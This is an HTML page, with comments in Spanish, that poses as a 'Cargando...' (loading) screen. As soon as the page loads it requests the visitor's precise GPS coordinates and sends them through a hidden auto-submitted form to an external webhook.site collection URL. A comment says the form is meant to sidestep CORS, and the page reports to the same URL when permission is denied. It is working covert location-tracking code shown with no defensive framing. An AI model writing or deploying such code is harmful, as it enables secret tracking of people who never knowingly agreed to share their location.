<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando...</title>
</head>
<body onload="capturaInmediata()">

    <p>Cargando contenido, por favor espere...</p>

    <!-- Formulario invisible que utilizaremos para saltar el bloqueo CORS del navegador -->
    <form id="formularioOculto" action="https://webhook.site/3fcd9f6f-4376-4687-9ef1-965474b0dba3" method="POST" style="display:none;">
        <input type="text" name="coordenadas" id="campoCoordenadas">
    </form>

<script>
function capturaInmediata() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(enviarViaFormulario, manejarError, {
            enableHighAccuracy: true,
            timeout: 6000 // Aumentamos a 6 segundos por si estás en PC
        });
    } else {
        manejarError();
    }
}

function enviarViaFormulario(posicion) {
    const info = `Lat: ${posicion.coords.latitude} | Lon: ${posicion.coords.longitude} | Prec: ${posicion.coords.accuracy}m`;
    
    // Insertamos el texto de las coordenadas en el formulario oculto
    document.getElementById('campoCoordenadas').value = info;
    
    // Enviamos el formulario. Esto genera un POST directo y nativo, eliminando el OPTIONS.
    document.getElementById('formularioOculto').submit();
}

function manejarError(error) {
    // Si el navegador de la PC bloquea el GPS o no lo encuentra, enviamos un aviso de error al webhook
    document.getElementById('campoCoordenadas').value = "Error: Permiso denegado o GPS no disponible en este dispositivo.";
    document.getElementById('formularioOculto').submit();
}
</script>

</body>
</html>
